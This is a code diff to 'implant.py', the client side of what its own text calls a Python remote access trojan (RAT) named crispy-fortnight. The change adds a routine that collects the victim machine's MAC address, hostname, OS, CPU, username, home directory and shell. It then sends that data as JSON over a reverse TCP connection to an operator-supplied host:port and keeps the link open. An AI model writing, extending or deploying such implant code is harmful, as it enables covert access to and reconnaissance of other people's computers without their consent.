@@ -1,33 +1,96 @@
-import argparse
+import datetime
+import json
+import os
+import platform
+import sys
+import uuid
 
 from crispy.network.client_types import CrispyTCPClient
 
-def main():
-    argp = argparse.ArgumentParser(description="Starts a reverse connection to either the crispy-fortnight \
-						(Python RAT) daemon or a proxy server.",
-                                   prog="implant")
-    argp.add_argument("--host",
-                        dest="host",
-                        help="Host to connect back to",
-                        metavar="<ip_addr>",
-                        required=True,
-                        type=str)    
-    argp.add_argument("--port",
-                        dest="port",
-                        help="Port on host to bind to",
-                        metavar="<port>",
-                        required=True,
-                        type=int)
-    args = argp.parse_args()
+def usage():
+    print "usage: implant.py host:port"
+    sys.exit(0)
+
+def enum():
+    macaddr = None
+    hostname = None
+    plat = None
+    proc_type = None   
+    proc_arch = None
+    uptime = None
+    date = None
+    user = None
+    home = None
+    shell = None
+    
+    try:
+	macaddr = ':'.join(("%012x" % uuid.getnode())[i:i+2] for i in range(0, 12, 2)) 
+    except:
+	pass
 
     try:
-	sock = CrispyTCPClient().connect(args.host, args.port)
+	hostname = platform.node() 
+    except:
+	pass
+
+    try:
+	plat = "{} {}".format(platform.system(), platform.release())
+    except:
+	pass
+
+    try:
+        proc_type = platform.processor()
+    except:
+        pass
+
+    try:
+        proc_arch = platform.machine()
+    except:
+        pass
+
+    try:
+        uptime = "forever"
+    except:
+        pass
+
+    try:
+        date = str(datetime.datetime.now()).split(".")[0]
+    except:
+        pass
+
+    try:
+        user = os.getenv('USER')
+    except:
+        pass
+
+    try:
+        home = os.getenv('HOME')
+    except:
+        pass
+
+    try:
+        shell = os.getenv('SHELL')
+    except:
+        pass
+
+    return (macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell)
+
+def main():
+    if len(sys.argv) == 2:
+	host, port = sys.argv[1].split(":")
+    else:
+    	usage()
+    
+    try:
+	sock = CrispyTCPClient().connect(host, port)
+	print "[+] Connected successfully"
+	sock.send(json.dumps(enum()))
 	while True:
 	    pass
-    except KeyboardInterrupt:
+    except KeyboardInterrupt: ###send "kill" msg to srv so srv can remove from session list?
 	pass
-    except Exception:
-	print "[!] Error connecting to {}:{}".format(args.host, args.port)
+    except Exception as e:
+	print "[!] Error connecting to {}:{} because of {}".format(host, port, e)
 
 if __name__ == "__main__":
     main()
